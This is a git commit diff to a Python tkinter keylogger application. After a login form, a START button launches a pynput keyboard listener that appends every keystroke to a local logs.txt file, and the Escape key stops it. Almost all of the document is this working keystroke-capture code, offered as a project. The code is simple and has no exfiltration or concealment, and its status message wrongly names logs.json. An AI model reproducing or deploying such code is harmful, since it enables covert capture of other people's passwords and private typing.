f63dc3383a23035b82a772ddf5a4b9fac3eddbdc
Aditya <88126377+eddyhacks@users.noreply.github.com>
2024-07-03 22:32:52 +0530

    Update keylog.py
    Updated the code to the latest one

--- keylogger/keylog.py
+++ keylogger/keylog.py
@@ -1,11 +1,10 @@
-import tkinter as tk
 from tkinter import *
+import tkinter as tk
 from PIL import ImageTk, Image 
 from tkinter import messagebox
 from tkinter.scrolledtext import ScrolledText
 from pynput import *
 from pynput.keyboard import Key,Listener
-import json
 
 root = tk.Tk()
 
@@ -13,25 +12,34 @@ key_strokes=""
 
 def update_txt_file(key):
     with open('logs.txt',"w+") as key_stroke:
-        key_stroke.write(key)
-        
-    
+        key_stroke.write(key) 
 
+#######################################################
+
+# ON_PRESS FUNCTION  
 def on_press(key):
     global key_strokes
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
+#######################################################
+
+# BUTTON ACTION ON STRART FUNCTION
 def butaction():
     print("{+} running keylogger successful!\n{!} saving the keys in logs.json")
     with keyboard.Listener(on_press=on_press, on_release = on_release) as listener:
         listener.join()
 
+########################################################
+
+# ON PRESS OF KEY ESCAPE RETURN
 def on_release(key):
     if key == Key.esc:
         return False
 
+########################################################
 
+# LOGIN FOR ROOT USER
 def Login():
         e = email.get()
         p = password.get() 
@@ -52,23 +60,21 @@ def Login():
             logout = Button(root,text="Logout",padx=20,bg="grey",fg = "red", relief=RIDGE,borderwidth=1,font= ('verdana',10,'bold'),cursor="hand2",command=Logout)
             logout.place(x=390,y=38)
 
-#########################################################################
+
             Button(root,text="START!!",padx=30,relief=RIDGE,borderwidth=1,bg="black",fg= "light green",font= ('verdana',10,'bold'),cursor="hand2",command = butaction).place(x=120,y=100)
-#########################################################################
+
             def stop():
                 root.destroy()
             Button(root,text="EXIT!!",padx=30,relief=RIDGE,borderwidth=1,bg="black",fg= "light green",font= ('verdana',10,'bold'),cursor="hand2",command = stop).place(x=250,y=100)
-#########################################################################
             m = Label(root,text="keylogger running ...",font= ('verdana',10,'bold'))
-            m.place(x=130,y=150)
-
-            #message = ScrolledText(root,width=40,height=5,relief=RIDGE,borderwidth=3)
-            #message.place(x=130,y=170)
-
-            
-
+            m.place(x=130,y=150)            
             root.mainloop()
 
+        else:
+            messagebox.showerror('Login error',"PLease Write the Valid Email and Password..User not authorized!!")            
+
+
+# MAIN 
 root.title('KeyLogger')
 root.geometry('400x300')
 root.maxsize(400,300)
@@ -83,24 +89,24 @@ h1.place(x=150,y=5)
 #img = ImageTk.PhotoImage(Image.open('gmail.png'))
 
 #logo = Label(root,image=img,borderwidth=0)
-#logo.place(x=150,y=38)
+#logo.place(x=170,y=50)
 
 
-e = Label(root,text="Username",font= ('verdana',10,'bold'))
-e.place(x=100,y=130)
+e = Label(root,text="UserName",font= ('verdana',10,'bold'))
+e.place(x=10,y=100)
 email = Entry(root,width=30,relief=RIDGE,borderwidth=3)
-email.place(x=100,y=150)
+email.place(x=10,y=120)
 
 
 
 p = Label(root,text="Password",font= ('verdana',10,'bold'))
-p.place(x=100,y=190)
+p.place(x=10,y=160)
 password = Entry(root,width=30,relief=RIDGE,borderwidth=3)
-password.place(x=100,y=210)
+password.place(x=10,y=180)
 
 
 login = Button(root,text="Login",padx=30,bg="black",fg = "white", relief=RIDGE,borderwidth=1,font= ('verdana',10,'bold'),cursor="hand2",command=Login)
-login.place(x=135,y=240)
+login.place(x=10,y=240)
 
 
 root.mainloop()
